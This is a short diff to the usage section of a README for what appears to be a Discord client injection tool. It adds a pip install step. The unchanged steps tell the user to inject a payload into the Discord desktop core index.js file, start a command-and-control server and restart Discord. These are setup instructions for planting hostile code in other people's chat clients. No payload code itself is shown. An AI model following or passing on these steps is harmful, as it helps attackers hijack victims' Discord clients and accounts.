@@ -11,6 +11,7 @@
 
 # How to use.
 
+0. `pip3 install websocket_server colored`
 1. Inject payload in `C:\Users\<username>\AppData\Local\<Discord_client_name>\app-x.xx.xxxx\modules\discord_desktop_core-1\discord_desktop_core\index.js`.
 3. Start cnc.
 4. Restart discord.
